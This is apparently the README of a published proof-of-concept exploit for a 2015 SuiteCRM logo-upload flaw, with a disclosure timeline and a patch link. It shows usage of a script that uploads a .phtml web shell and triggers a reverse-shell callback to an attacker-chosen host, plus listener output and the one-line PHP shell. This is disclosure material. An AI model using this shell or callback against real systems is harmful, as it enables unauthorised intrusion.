# Exploit for SuiteCRM Post-Authentication Shell Upload
SuiteCRM suffers a post-authentication shell upload vulnerability in its "Upload Company Logo" functionality, wherin it uses a blacklist in an attempt to prevent the upload of executable code. Furthermore, its "check for valid image" test leaves uploaded files in a tempdir that is web accessible. It is possible to bypass the blacklist to upload executable PHP code with the "phtml" extension to this temporary directory and thus gain code execution under the context of the webserver user on the affected system. This vulnerability was discovered by Darren Martyn of Xiphos Research Ltd. while assessing the SuiteCRM software. The version tested was "suitecrm-7.2.1-max", as available on the SuiteCRM website on the 5/5/2015.

## Usage

To use, simply select which payload you want to use (currently only back_python.php is available, but I plan on adding back_php.php and back_perl.php at a later date). This is the 
"payload.php". You also must specify a callback host and port, along with the URL to the vulnerable SuiteCRM installation, and a valid username and password for an administrative 
user.

Example Use:
```
xrl:~$ python2 suiteshell.py http://192.168.2.111/suitecrm-7.2.1-max/ admin admin back_python.php 192.168.2.116 1337

███████╗██╗   ██╗██╗████████╗███████╗███████╗██╗  ██╗███████╗██╗     ██╗     
██╔════╝██║   ██║██║╚══██╔══╝██╔════╝██╔════╝██║  ██║██╔════╝██║     ██║     
███████╗██║   ██║██║   ██║   █████╗  ███████╗███████║█████╗  ██║     ██║     
╚════██║██║   ██║██║   ██║   ██╔══╝  ╚════██║██╔══██║██╔══╝  ██║     ██║     
███████║╚██████╔╝██║   ██║   ███████╗███████║██║  ██║███████╗███████╗███████╗
╚══════╝ ╚═════╝ ╚═╝   ╚═╝   ╚══════╝╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝
Exploit for SuiteCRM Post-Auth Shell Upload Version: 20150512.1
{+} Logging into the CRM...
{+} Uploading our shell...
{+} Probing for our shell...
{+} Shell located and functioning at http://192.168.2.111/suitecrm-7.2.1-max/upload/tmp_logo_company_upload/suiteshell.phtml
{*} Sending our payload...
{+} Using 192.168.2.116:1337 as callback...
{+} Dropping shell...
{+} Shell dropped... Triggering...
{+} got shell?
xrl:~$
```
Listener (I suggest using the [tcp-pty-shell-handler][shellhandle]):
```
xrl:~$ python2 /tmp/testing/python-pty-shells/tcp_pty_shell_handler.py -b 0.0.0.0:1337
Got root yet?
Linux hackthecrm 3.19.0-15-generic #15-Ubuntu SMP Thu Apr 16 23:32:01 UTC 2015 i686 i686 i686 GNU/Linux
uid=33(www-data) gid=33(www-data) groups=33(www-data)
<suitecrm-7.2.1-max/upload/tmp_logo_company_upload$  cat suiteshell.phtml
<?php @assert(filter_input(0,woot,516)); ?>
<suitecrm-7.2.1-max/upload/tmp_logo_company_upload$
```

## Screenshot
![lol shell](https://raw.githubusercontent.com/XiphosResearch/exploits/master/suiteshell/screenshot/SuiteShell.png)

## Disclosure Timeline:
* 05/05/2015: Vulnerability discovered and validated. SuiteCRM contacted via twitter asking for a security contact.
* 06/05/2015: SuiteCRM provide security contact, vulnerability details sent.
* 06/05/2015: SuiteCRM respond and let me know I will be kept in the loop.
* 12/05/2015: No contact from SuiteCRM, automated PoC exploit written and provided along with notification of intent to request a CVE on 20/05/2015
* 20/05/2015: Deadline expires. Publish PoC and request CVE.

## Fix
[I submitted a pull request to temporarily patch the blacklist for now][pr]

## Licence
Licenced under the [WTFPL][wtfpl]

[wtfpl]: http://www.wtfpl.net/
[shellhandle]: https://github.com/infodox/python-pty-shells
[pr]: https://github.com/salesagility/SuiteCRM/pull/251
